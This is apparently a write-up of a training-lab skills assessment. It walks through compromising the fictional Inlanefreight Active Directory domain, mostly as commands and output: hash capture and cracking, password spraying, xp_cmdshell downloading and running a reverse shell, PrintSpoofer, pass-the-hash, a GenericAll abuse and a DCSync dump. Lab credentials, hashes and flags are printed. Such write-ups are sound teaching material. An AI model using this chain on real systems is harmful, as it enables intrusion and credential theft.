# AD Enumeration & Attacks - Skills Assessment Part II

## Scenario

> Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

## 10.129.143.68 attack box

### Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.129.143.68
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-02 18:16 EDT
Nmap scan report for 10.129.185.244
Host is up (0.040s latency).
Not shown: 60093 closed tcp ports (reset), 5440 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 97:cc:9f:d0:a3:84:da:d1:a2:01:58:a1:f2:71:37:e5 (RSA)
|   256 03:15:a9:1c:84:26:87:b7:5f:8d:72:73:9f:96:e0:f2 (ECDSA)
|_  256 55:c9:4a:d2:63:8b:5f:f2:ed:7b:4e:38:e1:c9:f5:71 (ED25519)
3389/tcp open  ms-wbt-server Microsoft Terminal Service

Network Distance: 2 hops
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   39.55 ms 10.10.14.1
2   39.90 ms 10.129.185.244

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.42 seconds
```

### Initial Access

Using given credentials access the machine via SSH. `htb-student:HTB_@cademy_stdnt!`

```shell
$ ssh htb-student@10.129.71.123                 
htb-student@10.129.71.123's password: 
Linux skills-par01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|


The programs included with the Parrot GNU/Linux are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Parrot GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15
┌─[htb-student@skills-par01]─[~]
└──╼ $whoami                                                                                           
htb-student
```

Discover the target subnet

```shell
$ifconfig
ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.7.240  netmask 255.255.254.0  broadcast 172.16.7.255
        inet6 fe80::2957:2d31:5225:229a  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:a4:d9  txqueuelen 1000  (Ethernet)
        RX packets 645  bytes 43903 (42.8 KiB)
        RX errors 0  dropped 36  overruns 0  frame 0
        TX packets 28  bytes 2148 (2.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Find the other hosts doing a ping sweep.

```shell
$fping -a -g 172.16.7.1 172.16.7.254 2>/dev/null                                                                      
172.16.7.3
172.16.7.50
172.16.7.60
172.16.7.240
```

With responder get the first hash

```bash
$sudo responder -I ens224
...
AB920::INLANEFREIGHT:e205f26f8291495f:5E69720E137108895E99F69A81ED339A:0101000000000000804D535D932FDB01955CDEEF49CBE4C300000000020008004A004C005900570001001E00570049004E002D00340057004B00340053004A004F00350058004700330004003400570049004E002D00340057004B00340053004A004F0035005800470033002E004A004C00590057002E004C004F00430041004C00030014004A004C00590057002E004C004F00430041004C00050014004A004C00590057002E004C004F00430041004C0007000800804D535D932FDB0106000400020000000800300030000000000000000000000000200000115801637F59268F84E68FA667CFFF2EF418BFAAA39DCAFF8F00333308C05CE90A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
```

Crack it with hashcat

```bash
$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force    
hashcat (v6.2.6) starting
...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

AB920::INLANEFREIGHT:e205f26f8291495f:5e69720e137108895e99f69a81ed339a:0101000000000000804d535d932fdb01955cdeef49cbe4c300000000020008004a004c005900570001001e00570049004e002d00340057004b00340053004a004f00350058004700330004003400570049004e002d00340057004b00340053004a004f0035005800470033002e004a004c00590057002e004c004f00430041004c00030014004a004c00590057002e004c004f00430041004c00050014004a004c00590057002e004c004f00430041004c0007000800804d535d932fdb0106000400020000000800300030000000000000000000000000200000115801637f59268f84e68fa667cfff2ef418bfaaa39dcaff8f00333308c05ce90a0010000000000000000000000000000000000009002e0063006900660073002f0049004e004c0041004e0045004600520049004700480054002e004c004f00430041004c00000000000000000000000000:weasal
```

`ab920:weasal`

The user can access .50

```shell
┌─[htb-student@skills-par01]─[~]
└──╼ $crackmapexec winrm 172.16.7.50 -u ab920 -p weasal                                                                      
WINRM       172.16.7.50     5985   NONE             [*] None (name:172.16.7.50) (domain:None)
WINRM       172.16.7.50     5985   NONE             [*] http://172.16.7.50:5985/wsman
WINRM       172.16.7.50     5985   NONE             [+] None\ab920:weasal (Pwn3d!)
```

Collect the domain data with bloodhound-python, transfer it to the attack machine via scp and upload it to bloodhound

```shell
$bloodhound-python -c All -u ab920 -p weasal -d inlanefreight.local -dc dc01.inlanefreight.local -ns 172.16.7.3 --zip
```

## 172.16.7.50 MS01

### Enumeration

```shell
$nmap -A -p- 172.16.7.50                                                                                                
Starting Nmap 7.92 ( https://nmap.org ) at 2025-05-03 05:34 EDT
Nmap scan report for 172.16.7.50
Host is up (0.00054s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-05-03T09:38:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
| Not valid before: 2025-05-02T09:05:28
|_Not valid after:  2025-11-01T09:05:28
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-03T09:38:26+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-03T09:38:26
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:02:b9 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 249.32 seconds
```

### Initial Access

Evil-winrm with ab920 credentials

```shell
$evil-winrm -i 172.16.7.50 -u ab920 -p weasal

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\AB920\Documents> whoami
inlanefreight\ab920
```

### Privilege Escalation

Get the flag

```shell
*Evil-WinRM* PS C:\> type flag.txt
aud1t_gr0up_m3mbersh1ps!
```

Make a user list with nxc and test weak passwords

```shell
$crackmapexec smb 172.16.7.3 -u ab920 -p weasal --users > users
$cat users | grep '.LOCAL\\' | awk  '{print $5}' | awk -F'\' '{print $2}' | sponge users
```

Try `Welcome1` as seen in the lessons.

```shell
$kerbrute passwordspray --dc 172.16.7.3 -d inlanefreight.local users Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 05/03/25 - Ronnie Flathers @ropnop

2025/05/03 11:27:29 >  Using KDC(s):
2025/05/03 11:27:29 >   172.16.7.3:88

2025/05/03 11:27:44 >  [+] VALID LOGIN:  BR086@inlanefreight.local:Welcome1
2025/05/03 11:27:44 >  Done! Tested 2901 logins (1 successes) in 14.787 seconds
```

`br086:Welcome1`

Searching DC shares there is a database config inside 172.16.7.3/Department Shares/IT/Private/development/web.config

```shell
$smbclient -U 'inlanefreight.local/br086%Welcome1'  //172.16.7.3/'Department Shares'                       
...
smb: \IT\Private\> cd development
smb: \IT\Private\development\> ls
  .                                   D        0  Fri Apr  1 11:04:07 2022
  ..                                  D        0  Fri Apr  1 11:04:07 2022
  web.config                          A     1203  Fri Apr  1 11:04:05 2022

                10328063 blocks of size 4096. 8140027 blocks available
smb: \IT\Private\development\> get web.config
getting file \IT\Private\development\web.config of size 1203 as web.config (391.6 KiloBytes/sec) (average 391.6 KiloBytes/sec)
```

```shell
$cat web.config                                                                                              
<?xml version="1.0" encoding="utf-8"?>

<configuration> 
    <system.web>
       <membership>
           <providers>
               <add name="WebAdminMembershipProvider" type="System.Web.Administration.WebAdminMembershipProvider" />
           </providers>
       </membership>
       <httpModules>
              <add name="WebAdminModule" type="System.Web.Administration.WebAdminModule"/>
        </httpModules>
        <authentication mode="Windows"/>
        <authorization>
              <allow users="netdb"/>
        </authorization>
        <identity impersonate="true"/>
       <trust level="Full"/>
       <pages validateRequest="true"/>
       <globalization uiCulture="auto:en-US" />
           <masterDataServices>  
            <add key="ConnectionString" value="server=Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS;database=master;Integrated Security=SSPI;Pooling=true"/> 
       </masterDataServices>  
       <connectionStrings>
           <add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
       </connectionStrings>
  </system.web>
</configuration>
```

Credentials for the sql instance in .60

Connect with administrator hash found in .60

```shell
$evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
ms01\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\users\administrator\desktop\flag.txt
exc3ss1ve_adm1n_r1ights!
```

### Post Exploitation

Start Inveigh to capture another user's hash

```shell
*Evil-WinRM* PS C:\> .\Inveigh.exe
[*] Inveigh 2.0.11 [Started 2025-05-03T12:31:50 | PID 3784]
[+] Packet Sniffer Addresses [IP 172.16.7.50 | IPv6 fe80::4d17:c185:b25:3958%5]
...
[+] [12:32:55] SMB(445) NTLM challenge [657FC8E7FD298751] sent to 172.16.7.50:51558
[+] [12:32:55] SMB(445) NTLMv2 captured for [INLANEFREIGHT\CT059] from 172.16.7.3(DC01):51558:
CT059::INLANEFREIGHT:657FC8E7FD298751:9A7E500D73CC87A0DBA889BDEE4C83C6:01010000000000002711A86751BCDB014925B826A4EB22560000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008002711A86751BCDB01060004000200000008003000300000000000000000000000002000001FA3085A887D0FA2252C1FB845AC575E5F32B98BF5A6E6B0049C7F42FA302F970A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
```

Using hashcat

```hash
$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force  
hashcat (v6.2.6) starting
...
CT059::INLANEFREIGHT:657fc8e7fd298751:9a7e500d73cc87a0dba889bdee4c83c6:01010000000000002711a86751bcdb014925b826a4eb22560000000002001a0049004e004c0041004e0045004600520045004900470048005400010008004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00030030004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008002711a86751bcdb01060004000200000008003000300000000000000000000000002000001fa3085a887d0fa2252c1fb845ac575e5f32b98bf5a6e6b0049c7f42fa302f970a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0037002e0035003000000000000000000000000000:charlie1
```

`ct059:charlie1`

Looking at bloodhound, this user has GenericAll to the group Domain Admins

![](assets/Pasted%20image%2020250503205145.png)

Add it to the group.

```shell
$net rpc group addmem "domain admins" "ct059" -U "inlanefreight"/"ct059"%"charlie1" -S "dc01.inlanefreight.local"                                                                                    
$crackmapexec winrm 172.16.7.3 -u ct059 -p charlie1                                             
WINRM       172.16.7.3      5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL)                                                                                 
WINRM       172.16.7.3      5985   DC01             [*] http://172.16.7.3:5985/wsman                 
WINRM       172.16.7.3      5985   DC01             [+] INLANEFREIGHT.LOCAL\ct059:charlie1 (Pwn3d!)
```

## 172.16.7.60 SQL01

### Enumeration

```shell
$nmap -A -p- 172.16.7.60
Starting Nmap 7.92 ( https://nmap.org ) at 2025-05-03 05:40 EDT
Nmap scan report for 172.16.7.60
Host is up (0.0011s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: SQL01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: SQL01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|_  Product_Version: 10.0.17763
|_ssl-date: 2025-05-03T09:44:23+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-05-03T09:05:33
|_Not valid after:  2055-05-03T09:05:33
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SQL01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:93:64 (VMware)
| ms-sql-info: 
|   Windows server name: SQL01
|   172.16.7.60\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
| smb2-time: 
|   date: 2025-05-03T09:44:18
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 255.51 seconds
```

### Initial Access

Use impacket-mssqlclient to access the instance

```shell
$impacket-mssqlclient inlanefreight.local/netdb:'D@ta_bAse_adm1n!'@172.16.7.60                 
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> enable_xp_cmdshell
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell whoami
output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress                                                        

NULL  
```

Generate a msfvenom reverse shell, get it and connect back to a more stable shell

```shell
SQL> xp_cmdshell certutil -f -urlcache -split http://172.16.7.240:4444/reverse.exe C:\users\public\documents\reverse.exe
SQL> xp_cmdshell C:\users\public\documents\reverse.exe
```

```shell
$nc -nlvp 5555                                                                                  
listening on [any] 5555 ...
connect to [172.16.7.240] from (UNKNOWN) [172.16.7.60] 62483
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt service\mssql$sqlexpress
```

### Privilege Escalation

User has seimpersonateprivs so using printspoofer

```shell
C:\Users\Public>certutil -f -split -urlcache http://172.16.7.240:6666/PrintSpoofer64.exe
C:\Users\Public>.\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -i -c powershell.exe                                                                         
[+] Found privilege: SeImpersonatePrivilege                                                                       
[+] Named pipe listening...                                                                                       
[+] CreateProcessAsUser() OK                                                                                      
Windows PowerShell                                                                                                
Copyright (C) Microsoft Corporation. All rights reserved.                                                         
                                                                                                                  
PS C:\Windows\system32> whoami                                                                                    
whoami
nt authority\system
```

### Post Exploitation

Upload mimikatz and get local hashes

```shell
PS C:\users\administrator\desktop> .\mimikatz.exe "lsadump::sam" "exit"                                                     
.\mimikatz.exe "lsadump::sam" "exit"                                                                                        
                                                                                                                            
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08                                                                
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                 
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                    
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                                                                     
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                   
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/                                                   
                                                                                                                            
mimikatz(commandline) # lsadump::sam                                                                                        
Domain : SQL01                                                                                                              
SysKey : 2cdbbee2d1fb9cfb7cf7189fa66971a6                                                                                   
Local SID : S-1-5-21-3827174835-953655006-33323432                                                                          
                                                                                                                            
SAMKey : 1f3713f605ea38af43344dc944dea5ce                                                                                   
                                                                                                                            
RID  : 000001f4 (500)                                                                                                       
User : Administrator                                                                                                        
  Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99
```

Reenter with evil-winrm for an easier postex

```shell
$evil-winrm -i 172.16.7.60 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
```

Get the flag

```shell
*Evil-WinRM* PS C:\users\administrator\desktop> type flag.txt
s3imp3rs0nate_cl@ssic
```

Testing the hash is also valid for .50

```shell
$crackmapexec smb 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99 --local-auth
SMB         172.16.7.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         172.16.7.50     445    MS01             [+] MS01\administrator bdaffbfe64f1fc646a3353be1c2c3c99 (Pwn3d!)
```

## 172.16.7.3 DC01

### Enumeration

```shell
$nmap -A -p- 172.16.7.3
Starting Nmap 7.92 ( https://nmap.org ) at 2025-05-03 05:44 EDT
Nmap scan report for inlanefreight.local (172.16.7.3)
Host is up (0.00087s latency).
Not shown: 65511 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-03 09:47:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49747/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-03T09:48:45
|_  start_date: N/A
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:d5:3b (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 251.40 seconds
```

### Initial Access

Using ct059 after add it to domain admins

```shell
$evil-winrm -i 172.16.7.3 -u ct059 -p charlie1

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\CT059\Documents> whoami
inlanefreight\ct059
```

### Post Exploitation

Get the  flag

```shell
*Evil-WinRM* PS C:\Users\administrator\desktop> type flag.txt
acLs_f0r_th3_w1n!
```

Get domain users hashes

```shell
$impacket-secretsdump inlanefreight/ct059:charlie1@172.16.7.3
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
...
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:234a798328eb83fda24119597ffba70b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::
```